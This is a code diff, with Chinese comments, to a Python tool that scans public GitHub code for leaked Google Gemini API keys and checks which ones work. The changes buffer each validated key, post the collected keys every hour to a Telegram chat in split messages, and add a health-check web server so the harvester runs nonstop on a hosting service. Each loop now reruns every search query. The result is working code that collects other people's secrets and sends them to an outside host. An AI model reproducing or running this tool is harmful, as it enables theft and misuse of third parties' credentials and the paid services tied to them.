@@ -4,8 +4,11 @@ import re
 import sys
 import time
 import traceback
+import threading
+import requests
 from datetime import datetime, timedelta
 from typing import Dict, List, Union, Any
+from http.server import BaseHTTPRequestHandler, HTTPServer
 
 import google.generativeai as genai
 from google.api_core import exceptions as google_exceptions
@@ -18,6 +21,10 @@ from utils.github_client import GitHubClient
 from utils.file_manager import file_manager, Checkpoint, checkpoint
 from utils.sync_utils import sync_utils
 
+# --- 新增：Telegram 定时发送相关变量 ---
+LAST_TG_SEND_TIME = time.time()
+PENDING_KEYS_TO_SEND = []
+
 # 创建GitHub工具实例和文件管理器
 github_utils = GitHubClient.create_instance(Config.GITHUB_TOKENS)
 
@@ -28,6 +35,62 @@ skip_stats = {
     "age_filter": 0,
     "doc_filter": 0
 }
+
+# --- 新增：健康检查 Web 服务类 (适配 Koyeb) ---
+class HealthCheckHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/plain')
+        self.end_headers()
+        self.wfile.write(b"OK")
+    def log_message(self, format, *args):
+        return  # 禁用日志
+
+def start_health_check_server():
+    port = int(os.environ.get("PORT", 8000))
+    server = HTTPServer(('0.0.0.0', port), HealthCheckHandler)
+    logger.info(f"👻 Health check server started on port {port}")
+    server.serve_forever()
+
+# --- 新增：Telegram 汇总发送函数 (支持长消息分段) ---
+def send_telegram_summary():
+    global LAST_TG_SEND_TIME, PENDING_KEYS_TO_SEND
+    
+    token = os.getenv("TG_BOT_TOKEN")
+    chat_id = os.getenv("TG_CHAT_ID")
+    
+    if not token or not chat_id or not PENDING_KEYS_TO_SEND:
+        PENDING_KEYS_TO_SEND = []
+        LAST_TG_SEND_TIME = time.time()
+        return
+
+    header = f"📊 【每小时抓取汇总】\n"
+    header += f"⏰ 时间: {datetime.now().strftime('%m-%d %H:%M')}\n"
+    header += f"✨ 新发现有效 Key: {len(PENDING_KEYS_TO_SEND)} 个\n\n"
+    
+    all_keys_text = "\n".join(PENDING_KEYS_TO_SEND)
+    full_message = header + all_keys_text
+    url = f"https://api.telegram.org/bot{token}/sendMessage"
+    
+    try:
+        MAX_LENGTH = 3500 # Telegram 限制为 4096，取 3500 留余量
+        if len(full_message) <= MAX_LENGTH:
+            requests.post(url, json={"chat_id": chat_id, "text": full_message}, timeout=15)
+        else:
+            parts = [full_message[i:i+MAX_LENGTH] for i in range(0, len(full_message), MAX_LENGTH)]
+            for index, part in enumerate(parts):
+                msg_text = part
+                if len(parts) > 1:
+                    msg_text = f"📦 部分 {index+1}/{len(parts)}：\n\n" + part
+                requests.post(url, json={"chat_id": chat_id, "text": msg_text}, timeout=15)
+                time.sleep(1) 
+                
+        logger.info(f"📤 已向 Telegram 发送汇总报告，共计 {len(PENDING_KEYS_TO_SEND)} 个 Key")
+    except Exception as e:
+        logger.error(f"❌ Telegram 发送失败: {e}")
+    
+    PENDING_KEYS_TO_SEND = []
+    LAST_TG_SEND_TIME = time.time()
 
 
 def normalize_query(query: str) -> str:
@@ -186,6 +249,10 @@ def process_item(item: Dict[str, Any]) -> tuple:
     if valid_keys:
         file_manager.save_valid_keys(repo_name, file_path, file_url, valid_keys)
         logger.info(f"💾 Saved {len(valid_keys)} valid key(s)")
+        
+        # --- 新增逻辑：存入 Telegram 发送缓冲区 ---
+        PENDING_KEYS_TO_SEND.extend(valid_keys)
+
         # 添加到同步队列（不阻塞主流程）
         try:
             # 添加到两个队列
@@ -251,6 +318,9 @@ def reset_skip_stats():
 
 
 def main():
+    # --- 新增：启动健康检查和定时逻辑初始化 ---
+    threading.Thread(target=start_health_check_server, daemon=True).start()
+    
     start_time = datetime.now()
 
     # 打印系统启动信息
@@ -307,6 +377,14 @@ def main():
             loop_count += 1
             logger.info(f"🔄 Loop #{loop_count} - {datetime.now().strftime('%H:%M:%S')}")
 
+            # =========================
+            # 【核心修改】
+            # 每开启新的一轮 Loop，就清空“已处理关键词”的记录
+            # 这确保了下一轮循环时，所有关键词都会被重新搜索
+            # =========================
+            if hasattr(checkpoint, 'processed_queries'):
+                checkpoint.processed_queries = set()
+
             query_count = 0
             loop_processed_files = 0
             reset_skip_stats()
@@ -353,8 +431,6 @@ def main():
 
                             loop_processed_files += 1
 
-
-
                         total_keys_found += query_valid_keys
                         total_rate_limited_keys += query_rate_limited_keys
 
@@ -382,6 +458,11 @@ def main():
 
             logger.info(f"🏁 Loop #{loop_count} complete - Processed {loop_processed_files} files | Total valid: {total_keys_found} | Total rate limited: {total_rate_limited_keys}")
 
+            # --- 新增逻辑：检查是否到了一小时，发送 Telegram 汇总 ---
+            if time.time() - LAST_TG_SEND_TIME >= 3600:
+                logger.info("🕒 Checking for hourly Telegram summary...")
+                send_telegram_summary()
+
             logger.info(f"💤 Sleeping for 10 seconds...")
             time.sleep(10)
 
@@ -397,6 +478,7 @@ def main():
             logger.error(f"💥 Unexpected error: {e}")
             traceback.print_exc()
             logger.info("🔄 Continuing...")
+            time.sleep(10)
             continue
 
 
